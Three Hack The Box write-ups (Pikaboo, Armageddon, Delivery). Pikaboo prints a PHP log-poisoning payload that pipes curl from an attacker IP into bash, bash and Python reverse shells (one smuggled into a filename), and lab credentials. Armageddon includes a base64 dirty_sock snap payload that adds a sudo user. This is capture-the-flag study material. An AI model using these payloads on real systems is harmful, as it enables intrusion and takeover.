item.title: HTB - Pikaboo
item.description:
A Hard Machine That Consist On Exploiting MisConfigurations

Slim To None

General Enumeration

Open Ports

21 (vstpd 3.0.3) - 22 (SSH), 80 (Nginx), 8081 (py HTTP)

Initial Enum

  • Web (80), Has AuthBasic (redirect to 401)

  • Confirmed Path Manipulation (Bypass 401) in /admin

    http://10.10.10.249/admin../server-status

Usernames And Passwords

  • No Credentials Found

Interesting Discoveries

  • admin page (http://10.10.10.249/admin) [Requires Credentials]
  • weird path /admin/adminstaging

Vulnerabilities And Exploitation

  • Possible Exploitation Path

log poisoning lead to RCE through LFI -> (Cache VSFTPD) -> RCE

  • Exploitation Of (Log Poisoning)
    1. We do have LFI adminstaging
    2. We Have A Valid Log file (/var/log/vsftpd.log)
    3. Payload
      1. USER Field
           <?php exec("curl http://10.10.14.210:8000/rev | bash")
      1. Inside Of rev
           #!/bin/bash
     /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.210/9110 0>&1'
      1. Curl The Path
           curl http://10.10.10.249/admin../admin_staging/index.php
     ?page=/var/log/vsftpd.log
  • Grab User.txt

User Enumeration

Interesting Discoveries

  • Cronjob (root) /usr/local/bin/csvupdatecron
  • /etc/apache2/htpasswd (HTPass Auth Basic) (Salted MD5)

Passwords

  1. xxj31ZMTZzkVA (/etc/apache2/sites-available/default-ssl.conf)
  2. Salted MD5 ($apr1$0.2FVvEK$Xn42uf/ySS5IPTKXfebXM.) [Not Cracked]
  3. J~42%W?PFHl]g (Ldap /opt/pokeapi/config/settings.py)

User

  • Grabing User Password Through Ldap

    ldapsearch -x -h 127.0.0.1 -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w J~42%W?PFHl]g -b 'dc=ftp,dc=pikaboo,dc=htb'

    • pwnmeow user

      # pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==

echo -n X0cwdFQ0X0M0dGNIXyczbV80bEwhXw== | base64 -d
_G0tT4_C4tcH_'3m_4lL!_

Privilege Escalation

Vulnerabities Exploitation

From The Previous Cronjobs We found we noticed there’s a script /usr/local/bin/csvupdatecron.

    #!/bin/bash
    
    for d in /srv/ftp/*
    do
      cd $d
      /usr/local/bin/csvupdate $(basename $d) *csv
      /usr/bin/rm -rf *
    done

Essentially What the script does is that it lists all the folders exist in /srv/ftp and takes all csv files and directs them as argument to another script called csvupdate. Now as we read the perl script, we noticed it does use open() function to open files, However after little bit of documentation reading we noticed that, if two filenames specified , if one had pipe symbol “|” it will be interpreted as command thus being executed it. Now Our Root Path has become more clear to what we should do. I Found this stack overflow discussion which demonstrate , how we can achieve this. Unfortunately this was not that simple! Bash commands were not suitable for this coz of being executed before even attempting to run them, and it the idea was to craft a malicious payload that will be a name of empty file that we will upload to pwnmeow user’s ftp as we got his credentials previously. Other thing was to create a temporary file that has our payload which we can then execute by calling its full path, tho the issue is that we cannot create filename’s as a path , which left us we fewer options. Since Python was available, we can use a oneliner reverse shell as our payload , tho it had to be really perfect specially with escaping double quotes. I Used the following oneliner reverse shell

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.210",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call("sh");'

After Editing it to escape double quotes and create an empty file

    touch "|python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\"10.10.14.210\"",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call("\"sh\"")';.csv"

Then we go back to ftp and upload it, ONE BIG FAT WARNING If you tried to upload the file to the root folder, it will not work and file will not be uploaded, and you’ll get really frustrated on why not it didn’t work like myself lol. Choose any folder , it doesn’t matter which one and upload it to it . Notice in ur listener it will first connect back from ur machine , kill it immediately and re-run your listener, After few seconds You’ll receive a

item.title: HTB - Armageddon
item.description:
Armageddon Easy Box By bertolis, that consists of basic identification of old unpatched web framework that is vulnerable to a remote code execution exploit, and little enumeration and database dump with password cracking and the wrong use of sudo permissions (terms).

Enumeration

  • We start of with an intense full port scan with nmap.

# Nmap 7.91 scan initiated Sat Mar 27 16:47:39 2021 as: nmap -p- --min-rate 10000 -v -oN full_port.nmap 10.129.100.170
Increasing send delay for 10.129.100.170 from 0 to 5 due to 55 out of 183 dropped probes since last increase.
Warning: 10.129.100.170 giving up on port because retransmission cap hit (10).
Increasing send delay for 10.129.100.170 from 640 to 1000 due to 110 out of 366 dropped probes since last increase.
Nmap scan report for armageddon.htb (10.129.100.170)
Host is up (0.098s latency).
Not shown: 40576 closed ports, 24958 filtered ports
PORT   STATE SERVICE
80/tcp open  http
  • Then we run another nmap scan to identify what version/service ports are running on.
# Nmap 7.91 scan initiated Sat Mar 27 16:48:56 2021 as: nmap -sC -sV -p80 -oN scan.nmap 10.129.100.170
Nmap scan report for armageddon.htb (10.129.100.170)
Host is up (0.070s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon
  • Nmap Identifies Port 80 To be running drupal 7 which is an old version and possibly surfring from many RCE’s Exploits .

Foothold

  • Checking Exploits that searchploit showed and from the name of the box it looks like the drupal installation is highly vulnerable to Drupalgeddon2/3 , further tho running Metasploit to launch the exploit.

  • After Few Moments.

User Enumeration

  • After Getting A foothold on the machine i tried spawning another shell to get a full tty shell ,however the following error is giving .

  • This concludes that the there’s some sort of firewall blocking it or there’s restrictions that don’t allow such outcoming connections like sandboxed programs in this case apache?.
  • However there’s an allowed connection at port 4444

  • Yet trying to spawn a tty results into another issue which confirms this a sandboxed environment .

  • Let’s get linpeas and run it, PS: Since this is a restricted environment we cannot make files executable or get them with any port unless 80.

  • Linpeas did find drupal Mysql password

  • Let’s check the full file [/var/www/html/sites/default/settings.php] for mysql username And Password.

  • Sweet , now let’s connect to mysql and dump what juicy stuff it holds .
  • Reminder, I had issues connecting to mysql directly with mysql client however i did a betterway to get the content of mysql database through mysqldump.

  • now i can just download it and cat it or import it to my own mysql server.

  • we can see that’s there’s the user brucetherealadmin which is a local user , let’s crack its hash and try to ssh with it.

  • Great it’s cracked , Now let’s try to ssh into Bruce and read the user.txt

Privilege Escalation

Initial Recon

  • After we got into user bruce let’s see if he has any sudo permissions,terms whatever .

  • Looks like he (bruce) can install snap packages , This is really interesting .

  • Let’s create a crafted snap package and install it simply it will be just a setuid binary packaged in snap that will get us root , otherway is by overwritten the content of /etc/passwd by adding a root user to it that will can ssh to …. , there’s alot of way tho.

  • There’s few exploits that were made for snapd that allowed installation of malicious crafted snaps , however we don’t need to run those exploits because this version of snap is patched and we have root privileges to install any snap package.

  • So In Order To Create a snap package i had to install an ubuntu vm cuz i’m running arch based os, so i cheated a bit and i didn’t want to run a vm so i used a prepacked snaps from those exploits link

  • i decoded the base64 and wrote it to a file using python

import base64
payload = ('''
aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw''' + 'A' * 4256 + '==')
d = base64.b64decode(payload)
open("crafted.snap",'wb').write(d)
  • Then downloaded the file and installed it .

  • Now let’s su to the dirty_sock user we added to /etc/passwd and read the root flag.

And That’s it , that’s Armageddon hope you enjoyed the writeup take care and i’ll see you all other time.

item.title: HTB - Delivery
item.description:
Delivery Easy Box By Ippsec

Foothold

Enumeration

We start of with the nmap , nmap -sC -sV -p- -T4 -oN delivery.nmap delivery.htb We can see there’s 3 ports open.

Let’s browse http and see what’s there.

We get a static website, looking at the site source there’s nothing much there but look around contact us we get this .

We can see a note from the site owner?

For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server

so let’s look at the helpdisk at helpdesk.delivery.htb

We see osticket support center,right of the top we check for any cves but they are all old and not affective so let’s create a new account .

Now After we created an account we get account verification but thinking logically we have entered a none existing email we cannot receive emails neither do anything. Hmmm there must be somewhere around it . let’s check the open ticket thing .

let’s fill those real quick .

We Get Support ticket request created with a ticket id and an email ? At this point i was hmmmmmmmmmmmm an email , going back to the text we got earlier

Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server

Now before we go and create an account at mattermost let’s check out ticket status.

We get an confirmation error,that’s not great at this point you gotta think out of the box. what email that might exist probably everywhere . let’s submit a new ticket real quick and check again.

And We Get Another ticket_id and email address , let’s check our ticket status

And some how magically We got in as Admin .

Now let’s go back to the mattermost and create an account with our ticket email

Also we get email verification , at this point you should really use your mind for a bit . we go back to our check ticket status and we get a reply

It’s the verification code, sweet now we can verify our email address and simply login.

Now Let’s explore a bit, we click on internal and get into the channel we see there’s messages left by admin over there .

We see credentials , Swwwwwweet .let’s login via ssh .

PS: I covered the credentials so you do the box instead of copying and pasting

And There we go , now we can read the user.txt

Privilege Escalation

At This point it’s pretty straight forward , let’s run linpeas.sh and see what’s going on but there’s nothing. let’s check /opt we can see mattermost installation let’s check it .

the first thing i do , is to check the configs since they usually store credentials , and sensitive information .

Oh the config.json is interesting , let’s check it out

We can see there’s an mysql settings with some credentails , running ss -lnpt we see mysql is running . Let’s Logging And Check The database. PS: The password is a hint itself it says crack the mattermost password which is the root password

Ah there’s too many tables there , but we just interested in the Users tables.

We have the root hash it’s a bcrypt type. now before we crack it, remember from the mattermost internal channel the admin user gave us a valuable hint .

PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.

This is a usefull hint to let us know that we should generate a wordlist from hashcat rules in order to crack the root hash through “PleaseSubscribe!” Let’s go to our crackred and generate a wordlist .

that’s not a big wordlist , it should crack really fast. let’s crack our hash.

And there we goo , we’ve cracked it,took about 2 seconds , now let’s su to root.

And That’s it , that’s delivery hope you enjoyed the writeup take care and i’ll see you all other time.
